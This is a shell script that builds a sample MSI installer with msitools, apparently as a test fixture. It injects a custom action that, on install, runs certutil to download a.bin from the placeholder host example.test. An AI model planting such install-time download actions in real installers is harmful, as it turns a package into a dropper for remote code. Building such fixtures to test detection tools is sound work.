#!/bin/sh
# Rebuilds launcher.msi.gz from sample.wxs with msitools (wixl, msibuild) on Linux:  sh build-launcher-msi.sh
# msibuild adds one program custom action (type 34, working directory + command line) and its sequence row.
set -e
here=$(cd "$(dirname "$0")" && pwd)
work=$(mktemp -d)
cd "$work"
mkdir files
printf 'installed readme' > files/readme.txt
printf 'nested report' > files/report.txt
printf 'zipped' > files/setup.zip
cp "$here/sample.wxs" .
wixl -o launcher.msi sample.wxs
msibuild launcher.msi -q "CREATE TABLE \`CustomAction\` (\`Action\` CHAR(72) NOT NULL, \`Type\` SHORT NOT NULL, \`Source\` CHAR(72), \`Target\` CHAR(255) PRIMARY KEY \`Action\`)" 2>/dev/null || true
msibuild launcher.msi -q "INSERT INTO \`CustomAction\` (\`Action\`, \`Type\`, \`Source\`, \`Target\`) VALUES ('FetchTool', 34, 'INSTALLDIR', 'certutil.exe -urlcache -f http://example.test/a.bin a.bin')"
msibuild launcher.msi -q "INSERT INTO \`InstallExecuteSequence\` (\`Action\`, \`Condition\`, \`Sequence\`) VALUES ('FetchTool', 'NOT Installed', 3991)"
gzip -9 -n -c launcher.msi > "${OUT:-$here/launcher.msi.gz}"
cd / && rm -rf "$work"
